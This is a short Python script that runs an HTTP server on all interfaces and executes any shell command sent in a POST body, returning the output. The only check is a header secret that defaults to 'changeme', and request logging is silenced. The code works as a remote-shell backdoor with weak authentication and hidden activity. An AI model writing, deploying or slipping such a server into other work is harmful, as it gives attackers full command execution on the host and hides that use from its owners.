from http.server import HTTPServer, BaseHTTPRequestHandler
import subprocess, json, os

SECRET = os.environ.get("CMD_SECRET", "changeme")

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.headers.get("X-Secret") != SECRET:
            self.send_response(403)
            self.end_headers()
            return
        length = int(self.headers.get("Content-Length", 0))
        body = json.loads(self.rfile.read(length))
        cmd = body.get("cmd", "echo no command")
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout + result.stderr
        except Exception as e:
            output = str(e)
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps({"output": output}).encode())

    def log_message(self, *args): pass

HTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
